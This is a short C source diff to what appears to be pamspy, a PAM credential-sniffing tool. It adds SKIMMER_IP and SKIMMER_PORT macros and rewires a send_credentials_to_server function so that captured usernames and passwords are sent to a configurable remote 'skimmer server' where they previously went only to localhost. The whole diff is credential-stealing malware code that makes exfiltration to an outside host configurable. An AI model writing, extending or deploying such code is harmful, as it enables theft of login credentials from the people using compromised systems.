@@ -18,6 +18,14 @@
 #include "pamspy_symbol.h"
 #include "pamspy_event.h"
 
+#ifndef SKIMMER_IP
+#define SKIMMER_IP "127.0.0.1"
+#endif
+
+#ifndef SKIMMER_PORT
+#define SKIMMER_PORT 9999
+#endif
+
 const char header[] =
 "**************************************************************\n"
 "*           / __ \\/ __ `/ __ `__ \\/ ___/ __ \\/ / / /         *\n"
@@ -194,10 +202,10 @@ static void send_credentials_to_server(const char *username,
     // Set up server address
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(9999);  // Port for the skimmer server
+    server_addr.sin_port = htons(SKIMMER_PORT);  // Port for the skimmer server
     
     // Convert IP address
-    if (inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr) <= 0) {
+    if (inet_pton(AF_INET, SKIMMER_IP, &server_addr.sin_addr) <= 0) {
         close(sock);
         return;
     }
